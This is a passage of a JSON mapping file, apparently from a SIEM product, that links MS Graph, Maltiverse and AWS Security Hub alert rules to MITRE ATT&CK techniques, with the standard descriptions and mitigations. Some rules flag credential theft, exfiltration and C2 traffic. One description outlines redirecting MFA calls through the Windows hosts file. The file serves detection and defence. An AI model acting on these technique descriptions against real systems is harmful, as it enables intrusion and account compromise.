        "rule_description": "MS Graph message: Indicators that the system is performing network discovery or account enumeration have been detected. This alert may be indicative of an APT.",
        "mitre_id": [
            "TA0007"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99567,
        "rule_description": "MS Graph message: Indicators that the system is performing data exfiltration have been detected. This alert may be indicative of an APT.",
        "mitre_id": [
            "TA0010"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99568,
        "rule_description": "MS Graph message: Indicators of vulnerability exploitation on the system have been detected. This alert may be indicative of an APT.",
        "mitre_id": [
            "T1587.004"
        ],
        "possible_attacks": [
            "Exploits"
        ],
        "description": [
            "Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits. Adversaries may use information acquired via [Vulnerabilities]( to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.\n\nAs with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application]( [Exploitation for Client Execution]( [Exploitation for Privilege Escalation]( [Exploitation for Defense Evasion]( [Exploitation for Credential Access]( [Exploitation of Remote Services]( and [Application or System Exploitation]("
        ],
        "mitigation_strategies": [
            "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
        ]
    },
    {
        "rule_id": 99569,
        "rule_description": "MS Graph message: Indicators that the system is performing malicious code execution have been detected. This alert may be indicative of an APT.",
        "mitre_id": [
            "TA0002"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99570,
        "rule_description": "MS Graph message: Indicators that the system is affected by intrusion attempts have been detected. This alert may be indicative of an APT.",
        "mitre_id": [
            "TA0001"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99571,
        "rule_description": "MS Graph message: Indicators that the system is establishing unauthorized internal connections have been detected. This alert may be indicative of an APT.",
        "mitre_id": [
            "TA0008"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99572,
        "rule_description": "MS Graph message: Indicators that the system is affected by persistence establishment attempts have been detected. This alert may be indicative of an APT.",
        "mitre_id": [
            "TA0003"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99573,
        "rule_description": "MS Graph message: Indicators that the system is performing unauthorized permission elevation have been detected. This alert may be indicative of an APT.",
        "mitre_id": [
            "TA0004"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99581,
        "rule_description": "MS Graph message: Indicators that the system is communicating with a C2 server have been detected. This alert is very likely to indicate an APT.",
        "mitre_id": [
            "TA0011"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99582,
        "rule_description": "MS Graph message: Indicators that the system is performing data collection or data discovery have been detected. This alert is very likely to indicate an APT.",
        "mitre_id": [
            "TA0009"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99583,
        "rule_description": "MS Graph message: Indicators that the system is involved in stealing credentials have been detected. This alert is very likely to indicate an APT.",
        "mitre_id": [
            "TA0006"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99584,
        "rule_description": "MS Graph message: Indicators that the system is performing defense evasion have been detected. This alert is very likely to indicate an APT.",
        "mitre_id": [
            "TA0005"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99585,
        "rule_description": "MS Graph message: Indicators that the system is performing network discovery or account enumeration have been detected. This alert is very likely to indicate an APT.",
        "mitre_id": [
            "TA0007"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99586,
        "rule_description": "MS Graph message: Indicators that the system is performing data exfiltration have been detected. This alert is very likely to indicate an APT.",
        "mitre_id": [
            "TA0010"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99587,
        "rule_description": "MS Graph message: Indicators of vulnerability exploitation on the system have been detected. This alert is very likely to indicate an APT.",
        "mitre_id": [
            "T1587.004"
        ],
        "possible_attacks": [
            "Exploits"
        ],
        "description": [
            "Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits. Adversaries may use information acquired via [Vulnerabilities]( to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.\n\nAs with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application]( [Exploitation for Client Execution]( [Exploitation for Privilege Escalation]( [Exploitation for Defense Evasion]( [Exploitation for Credential Access]( [Exploitation of Remote Services]( and [Application or System Exploitation]("
        ],
        "mitigation_strategies": [
            "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
        ]
    },
    {
        "rule_id": 99588,
        "rule_description": "MS Graph message: Indicators that the system is performing malicious code execution have been detected. This alert is very likely to indicate an APT.",
        "mitre_id": [
            "TA0002"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99589,
        "rule_description": "MS Graph message: Indicators that the system is affected by intrusion attempts have been detected. This alert is very likely to indicate an APT.",
        "mitre_id": [
            "TA0001"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99590,
        "rule_description": "MS Graph message: Indicators that the system is establishing unauthorized internal connections have been detected. This alert is very likely to indicate an APT.",
        "mitre_id": [
            "TA0008"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99591,
        "rule_description": "MS Graph message: Indicators that the system is infected with malware have been detected.",
        "mitre_id": [
            "T1204.001",
            "T1204.002",
            "T1204.003",
            "T1587.001",
            "T1588.001"
        ],
        "possible_attacks": [
            "Malicious Link",
            "Malicious File",
            "Malicious Image",
            "Malware",
            "Malware"
        ],
        "description": [
            "An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link]( Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution]( Links may also lead users to download files that require execution via [Malicious File](",
            "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment]( Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.\n\nAdversaries may employ various forms of [Masquerading]( and [Obfuscated Files or Information]( to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile [Malicious File]( frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](",
            "Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware]( and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.\n\nAdversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Name or Location](",
            "Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\n\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](",
            "Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries)."
        ],
        "mitigation_strategies": [
            "Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.",
            "Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.",
            "Train users to be aware of the existence of malicious images and how to avoid deploying instances and containers from them.",
            "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.",
            "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
        ]
    },
    {
        "rule_id": 99592,
        "rule_description": "MS Graph message: Indicators that the system is affected by persistence establishment attempts have been detected. This alert is very likely to indicate an APT.",
        "mitre_id": [
            "TA0003"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99593,
        "rule_description": "MS Graph message: Indicators that the system is performing unauthorized permission elevation have been detected. This alert is very likely to indicate an APT.",
        "mitre_id": [
            "TA0004"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99594,
        "rule_description": "MS Graph message: Indicators that the system is infected with ransomware have been detected. Requires immediate action.",
        "mitre_id": [
            "T1486"
        ],
        "possible_attacks": [
            "Data Encrypted for Impact"
        ],
        "description": [
            "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification]( or [System Shutdown/Reboot]( in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts]( [OS Credential Dumping]( and [SMB/Windows Admin Shares]( Encryption malware may also leverage [Internal Defacement]( such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted."
        ],
        "mitigation_strategies": [
            "Consider implementing IT disaster recovery plans that contain procedures for regularly taking and testing data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery. Consider enabling versioning in cloud environments to maintain backup copies of storage objects."
        ]
    },
    {
        "rule_id": 99607,
        "rule_description": "MS Graph message: Malware has been detected in the environment. This is a true positive alert.",
        "mitre_id": [
            "T1204.001",
            "T1204.002",
            "T1204.003",
            "T1587.001",
            "T1588.001"
        ],
        "possible_attacks": [
            "Malicious Link",
            "Malicious File",
            "Malicious Image",
            "Malware",
            "Malware"
        ],
        "description": [
            "An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link]( Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution]( Links may also lead users to download files that require execution via [Malicious File](",
            "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment]( Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.\n\nAdversaries may employ various forms of [Masquerading]( and [Obfuscated Files or Information]( to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile [Malicious File]( frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](",
            "Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware]( and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.\n\nAdversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Name or Location](",
            "Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\n\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](",
            "Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries)."
        ],
        "mitigation_strategies": [
            "Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.",
            "Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.",
            "Train users to be aware of the existence of malicious images and how to avoid deploying instances and containers from them.",
            "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.",
            "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
        ]
    },
    {
        "rule_id": 99613,
        "rule_description": "MS Graph message: A phishing email has been detected. This is a true positive alert.",
        "mitre_id": [
            "T1566"
        ],
        "possible_attacks": [
            "Phishing"
        ],
        "description": [
            "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules]( Another way to accomplish this is by forging or spoofing the identity of the sender which can be used to fool both the human recipient as well as automated security tools, or by including the intended target as a party to an existing email thread that includes malicious files or links (i.e., \"thread hijacking\").\n\nVictims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware, or install adversary-accessible remote management tools onto their computer (i.e., [User Execution]("
        ],
        "mitigation_strategies": [
            "Users can be trained to identify social engineering techniques and phishing emails."
        ]
    },
    {
        "rule_id": 99701,
        "rule_description": "Maltiverse: Alert Software $(threat.software.name) - Detected IoC $(threat.indicator.name) of type $(threat.indicator.type) with [$(threat.indicator.confidence)] that is related to $(threat.software.id)-$(threat.software.name) software known attack.",
        "mitre_id": [
            "$(threat.software.id)"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99836,
        "rule_description": "AWS Security Hub - The S3 bucket used to store CloudTrail logs is publicly accessible.",
        "mitre_id": [
            "T1213",
            "T1119",
            "T1530"
        ],
        "possible_attacks": [
            "Data from Information Repositories",
            "Automated Collection",
            "Data from Cloud Storage"
        ],
        "description": [
            "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, such as Credential Access, Lateral Movement, or Defense Evasion, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization (i.e., [Transfer Data to Cloud Account]( \n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials (i.e., [Unsecured Credentials]( \n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n* Contact or other sensitive information about business partners and customers, including personally identifiable information (PII) \n\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include the following:\n\n* Storage services such as IaaS databases, enterprise databases, and more specialized platforms such as customer relationship management (CRM) databases \n* Collaboration platforms such as SharePoint, Confluence, and code repositories\n* Messaging platforms such as Slack and Microsoft Teams \n\nIn some cases, information repositories have been improperly secured, typically by unintentionally allowing for overly-broad access by all users or even public access to unauthenticated users. This is particularly common with cloud-native or cloud-hosted services, such as AWS Relational Database Service (RDS), Redis, or ElasticSearch.",
            "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter]( to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. \n\nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. \n\nThis functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [File and Directory Discovery]( and [Lateral Tool Transfer]( to identify and move files, as well as [Cloud Service Dashboard]( and [Cloud Storage Object Discovery]( to identify resources in cloud environments.",
            "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API]( In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories]( \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem. There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects."
        ],
        "mitigation_strategies": [
            "Develop and publish policies that define acceptable information to be stored in repositories.",
            "Encryption and off-system storage of sensitive information may be one way to mitigate collection of files, but may not stop an adversary from acquiring the information if an intrusion persists over a long period of time and the adversary is able to discover and access the data through other means.",
            "Configure user permissions groups and roles for access to cloud storage. Implement strict Identity and Access Management (IAM) controls to prevent access to storage solutions except for the applications, users, and services that require access. Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary."
        ]
    },
    {
        "rule_id": 99837,
        "rule_description": "AWS Security Hub - CodeBuild Bitbucket source repository URL contains sensitive credentials.",
        "mitre_id": [
            "T1213.003"
        ],
        "possible_attacks": [
            "Code Repositories"
        ],
        "description": [
            "Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.\n\nOnce adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or [Unsecured Credentials]( contained within software's source code.  Having access to software's source code may allow adversaries to develop [Exploits]( while credentials may provide access to additional resources using [Valid Accounts](\n\n**Note:** This is distinct from [Code Repositories]( which focuses on conducting [Reconnaissance]( via public code repositories."
        ],
        "mitigation_strategies": [
            "Develop and publish policies that define acceptable information to be stored in code repositories."
        ]
    },
    {
        "rule_id": 99838,
        "rule_description": "AWS Security Hub - CodeBuild project environment variable contain clear text credentials.",
        "mitre_id": [
            "T1552"
        ],
        "possible_attacks": [
            "Unsecured Credentials"
        ],
        "description": [
            "Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History]( operating system or application-specific repositories (e.g. [Credentials in Registry](  or other specialized files/artifacts (e.g. [Private Keys]("
        ],
        "mitigation_strategies": [
            "Ensure that developers and system administrators are aware of the risk associated with having plaintext passwords in software configuration files that may be left on endpoint systems or servers."
        ]
    },
    {
        "rule_id": 99844,
        "rule_description": "AWS Security Hub - Elasticsearch domain is publicly accessible.",
        "mitre_id": [
            "T1530"
        ],
        "possible_attacks": [
            "Data from Cloud Storage"
        ],
        "description": [
            "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API]( In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories]( \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem. There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects."
        ],
        "mitigation_strategies": [
            "Configure user permissions groups and roles for access to cloud storage. Implement strict Identity and Access Management (IAM) controls to prevent access to storage solutions except for the applications, users, and services that require access. Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary."
        ]
    },
    {
        "rule_id": 99846,
        "rule_description": "AWS Security Hub - Hardware MFA not enabled for the root user.",
        "mitre_id": [
            "T1556.006"
        ],
        "possible_attacks": [
            "Multi-Factor Authentication"
        ],
        "description": [
            "Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.\n\nOnce adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication Request Generation]( adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.\n\nFor example, modifying the Windows hosts file (`C:\\windows\\system32\\drivers\\etc\\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA.  \n\nDepending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment. "
        ],
        "mitigation_strategies": [
            "Ensure that proper policies are implemented to dictate the secure enrollment and deactivation of MFA for user accounts."
        ]
    },
    {
        "rule_id": 99847,
        "rule_description": "AWS Security Hub - MFA not enabled for the root user.",
        "mitre_id": [
            "T1556.006"
        ],
        "possible_attacks": [
            "Multi-Factor Authentication"
        ],
        "description": [
            "Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.\n\nOnce adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication Request Generation]( adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.\n\nFor example, modifying the Windows hosts file (`C:\\windows\\system32\\drivers\\etc\\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA.  \n\nDepending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment. "
        ],
        "mitigation_strategies": [
            "Ensure that proper policies are implemented to dictate the secure enrollment and deactivation of MFA for user accounts."
        ]
    },
    {
        "rule_id": 99848,
        "rule_description": "AWS Security Hub - AWS KMS keys scheduled for deletion.",
        "mitre_id": [
            "T1485"
        ],
        "possible_attacks": [
            "Data Destruction"
        ],
        "description": [
            "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe]( and [Disk Structure Wipe]( because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. In some cases politically oriented image files have been used to overwrite data.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts]( [OS Credential Dumping]( and [SMB/Windows Admin Shares](\n\nIn cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers."
        ],
        "mitigation_strategies": [
            "In cloud environments, limit permissions to modify cloud bucket lifecycle policies (e.g., `PutLifecycleConfiguration` in AWS) to only those accounts that require it. In AWS environments, consider using Service Control policies to limit the use of the `PutBucketLifecycle` API call. "
        ]
    }
]